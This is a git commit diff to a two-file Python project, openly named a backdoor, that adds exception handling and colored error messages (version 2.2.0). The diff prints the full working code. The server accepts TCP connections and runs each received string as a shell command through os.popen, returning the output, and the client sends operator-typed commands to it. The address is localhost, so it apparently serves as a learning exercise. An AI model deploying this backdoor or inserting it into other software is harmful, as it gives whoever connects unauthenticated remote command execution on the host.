2f30ebbe9f1802db27092a7e7ffe29c015e59361
Andrés Hernández Mata <andreshernandezmta@gmail.com>
2021-04-14 09:58:05 -0500

    Mensajes para las excepciónes
    Version 2.2.0

--- src/backdoor_cliente.py
+++ src/backdoor_cliente.py
@@ -1,7 +1,7 @@
 """
 Uso: Backdoor Cliente
 Creador: Andrés Hernández Mata
-Version: 2.1.1
+Version: 2.2.0
 Python: 3.9.1
 Fecha: 08 Abril 2020
 """
@@ -9,36 +9,40 @@ Fecha: 08 Abril 2020
 import socket
 import sys
 import os
+from colorama import Fore
+from colorama import Style
 
 os.system("cls")
 
 servidor = ("127.0.0.1", 2000)
 bufferSize = 1024
 
-TCPClientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-TCPClientSocket.connect(servidor)
+try:
+    TCPClientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    TCPClientSocket.connect(servidor)
+    print("[+] Estableciendo Conexión...")
+    while True:
+        print("[+] Ingresar Comando...")
+        comando = input("> ")
+        if comando == "exit":
+            comando = comando.encode()
+            TCPClientSocket.send(comando)
+            TCPClientSocket.close()
+            print("[+] Cerrando Conexion...")    
+            print("[+] Saliendo...")
+            print("[-] Bye...")
+            sys.exit()
+        else:
+            os.system("cls")
+            print("[+] Enviando Comando...")
+            comando = comando.encode()
+            TCPClientSocket.send(comando)
+            salida = TCPClientSocket.recv(bufferSize)
+            print("[+] Espere...")        
+            salida = salida.decode()
+            print("[+] Salida...")
+            print(salida)
+except Exception:    
+    print(Fore.RED + "Ocurrio una excepción en la conexion del servidor" + Style.RESET_ALL)
 
-print("[+] Estableciendo Conexión...")
-
-while True:
-    print("[+] Ingresar Comando...")
-    comando = input("> ")
-    if comando == "exit":
-        comando = comando.encode()
-        TCPClientSocket.send(comando)
-        TCPClientSocket.close()
-        print("[+] Cerrando Conexion...")    
-        print("[+] Saliendo...")
-        print("[-] Bye...")
-        sys.exit()
-    else:
-        os.system("cls")
-        print("[+] Enviando Comando...")
-        comando = comando.encode()
-        TCPClientSocket.send(comando)
-        salida = TCPClientSocket.recv(bufferSize)
-        print("[+] Espere...")        
-        salida = salida.decode()
-        print("[+] Salida...")
-        print(salida)
 
--- src/backdoor_servidor.py
+++ src/backdoor_servidor.py
@@ -1,7 +1,7 @@
 """
 Uso: Backdoor Servidor
 Creador: Andrés Hernández Mata
-Version: 2.1.2
+Version: 2.2.0
 Python: 3.9.1
 Fecha: 08 Abril 2020
 """
@@ -17,33 +17,33 @@ os.system("cls")
 servidor = ("127.0.0.1", 2000)
 bufferSize = 1024
 
-TCPServerSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-TCPServerSocket.bind(servidor)
-TCPServerSocket.listen(5)  
-
-print("[+] Iniciado Servidor...")
-
-while True:    
-    cliente, direccion = TCPServerSocket.accept()
-    print("[+] Direccion ", direccion)          
-    while True:        
-        comando = cliente.recv(bufferSize)
-        if comando == b"exit":
-            cliente.close()
-            print("[+] Cerrando Conexion...")            
-            print("[+] Saliendo...")
-            print("[-] Bye...")            
-            sys.exit()                       
-        else:
-            print("[+] Recibiendo Comando...") 
-            comando = comando.decode()    
-            salida = os.popen(comando)
-            print("[+] Ejecutando " + Fore.GREEN + comando + Style.RESET_ALL)  
-            salida = salida.read()
-            print("[+] Enviando Resultado...")
-            salida = salida.encode()
-            cliente.send(salida)    
-            print("\n")
-            print("[+] Esperando...")    
-
+try:
+    TCPServerSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    TCPServerSocket.bind(servidor)
+    TCPServerSocket.listen(5)
+    print("[+] Iniciado Servidor...")
+    while True:    
+        cliente, direccion = TCPServerSocket.accept()
+        print("[+] Direccion ", direccion)          
+        while True:        
+            comando = cliente.recv(bufferSize)
+            if comando == b"exit":
+                cliente.close()
+                print("[+] Cerrando Conexion...")            
+                print("[+] Saliendo...")
+                print("[-] Bye...")            
+                sys.exit()                       
+            else:
+                print("[+] Recibiendo Comando...") 
+                comando = comando.decode()    
+                salida = os.popen(comando)
+                print("[+] Ejecutando " + Fore.GREEN + comando + Style.RESET_ALL)  
+                salida = salida.read()
+                print("[+] Enviando Resultado...")
+                salida = salida.encode()
+                cliente.send(salida)    
+                print("\n")
+                print("[+] Esperando...")    
+except Exception:
+    print(Fore.RED + "Ocurrio una excepción en la conexion del cliente" + Style.RESET_ALL)
 
